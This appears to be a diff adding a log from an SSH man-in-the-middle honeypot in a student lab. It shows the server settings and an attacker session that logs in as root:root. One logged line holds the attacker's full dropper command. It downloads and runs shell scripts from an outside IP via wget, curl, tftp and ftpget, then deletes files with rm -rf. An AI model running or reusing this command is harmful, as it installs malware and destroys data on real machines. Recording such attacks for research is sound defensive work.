@@ -1,0 +1,42 @@
+
+{"level":"error","message":"Forever detected script was killed by signal: SIGKILL"}
+(node:4134148) Warning: Accessing non-existent property 'padLevels' of module exports inside circular dependency
+(Use `node --trace-warnings ...` to show where the warning was created)
+Started with the following options:
+{
+  debug: true,
+  mitmIp: '10.0.3.1',
+  autoAccess: true,
+  autoAccessCache: 5000,
+  maxAttemptsPerConnection: 6,
+  sshServerIdentifier: 'SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2',
+  containerMountPathPrefix: '/var/lib/lxc',
+  containerMountPathSuffix: 'rootfs/',
+  loggingAttackerStreams: '/home/student/MITM/logs/session_streams',
+  loggingAuthenticationAttempts: '/home/student/MITM/logs/authentication_attempts',
+  loggingLogins: '/home/student/MITM/logs/logins',
+  loggingKeystrokes: '/home/student/MITM/logs/keystrokes',
+  containerName: 'DATABASE_1',
+  containerIp: '10.0.3.160',
+  mitmPort: 1000,
+  autoAccessFixed: 1
+}
+2022-10-23 06:15:34.852 - [Info] MITM Version: 2
+2022-10-23 06:15:34.853 - [Info] Auto Access Enabled: true
+2022-10-23 06:15:34.853 - [Debug] [Init] Auto Access Theshold Achieved: false
+2022-10-23 06:15:34.859 - [Info] SSH man-in-the-middle server for 10.0.3.160 listening on 10.0.3.1:1000
+2022-10-23 06:25:36.451 - [Debug] [Connection] Attacker connected: 45.139.105.214 | Client Identification: SSH-2.0-libssh2_1.4.3
+2022-10-23 06:25:37.358 - [Debug] [Auth] Attacker 45.139.105.214 trying to authenticate with 'password'
+2022-10-23 06:25:37.360 - [Debug] [Auto Access] Attacker: 45.139.105.214, Threshold: 1, Attempts: 1
+2022-10-23 06:25:37.360 - [Debug] [Auto Access] Compromising the honeypot
+2022-10-23 06:25:37.360 - [Debug] [Auto Access] Adding the following credentials: 'root:root'
+2022-10-23 06:25:37.444 - [Debug] [Auto Access] Auto-access is now disabled for the remainder of this MITM server instance
+2022-10-23 06:25:37.446 - [Debug] [Auth] Valid credentials - Password Authentication
+2022-10-23 06:25:37.446 - [Debug] [LXC] Attempting to connect to the honeypot: 10.0.3.160
+2022-10-23 06:25:37.513 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2022-10-23 06:25:37.931 - [Debug] [EXEC] Noninteractive mode attacker command: cat /etc/issue ; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.209.134.235/sensi.sh; curl -O http://85.209.134.235/sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp 85.209.134.235 -c get sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp -r sensi2.sh -g 85.209.134.235; chmod 777 sensi2.sh; sh sensi2.sh; ftpget -v -u anonymous -p anonymous -P 21 85.209.134.235 sensi1.sh sensi1.sh; sh sensi1.sh; rm -rf sensi.sh sensi.sh sensi2.sh sensi1.sh; rm -rf *
+2022-10-23 06:25:47.174 - [Debug] [Connection] Attacker connected: 45.139.105.214 | Client Identification: SSH-2.0-libssh2_1.4.3
+2022-10-23 06:25:48.059 - [Debug] [Auth] Attacker 45.139.105.214 trying to authenticate with 'password'
+2022-10-23 06:25:48.059 - [Debug] [Auth] Attacker authentication error: Invalid credentials - Password Authentication Failure
+2022-10-23 06:25:48.060 - [Debug] [Auth] Attacker: 45.139.105.214 has so far made 1 attempts. Remaining: 5 attempts
+2022-10-23 06:25:48.272 - [Debug] [Connection] Attacker closed the connection
